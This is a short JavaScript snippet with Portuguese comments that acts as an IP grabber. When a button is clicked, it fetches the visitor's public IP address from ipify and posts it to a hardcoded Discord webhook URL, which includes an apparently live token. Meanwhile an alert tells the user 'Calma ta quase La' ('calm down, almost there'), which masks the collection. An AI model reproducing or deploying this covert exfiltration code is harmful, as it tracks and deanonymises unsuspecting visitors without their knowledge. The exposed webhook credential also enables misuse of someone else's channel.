document.getElementById("myButton").addEventListener("click", function() {
    var xhr = new XMLHttpRequest();
    var url = "https://discord.com/api/webhooks/1113703626624471110/ujdBy3q8-T8njb4OJXQL_LProhN9G9vuWmcXmSszs9wGUJaN-j-ddErxPn7uOc7djhOf"; // Substitua pelo seu URL do webhook do Discord

    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");

    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 204) {
            alert("Calma ta quase La");
        }
    };

    // Obter o endereço IP usando a API "ipify"
    var ipUrl = "https://api.ipify.org?format=json";

    var ipRequest = new XMLHttpRequest();
    ipRequest.open("GET", ipUrl, true);

    ipRequest.onload = function() {
        if (ipRequest.status === 200) {
            var ipInfo = {
                content: "Novo IP detectado: " + JSON.parse(ipRequest.responseText).ip
            };

            xhr.send(JSON.stringify(ipInfo));
        }
    };

    ipRequest.send();
});
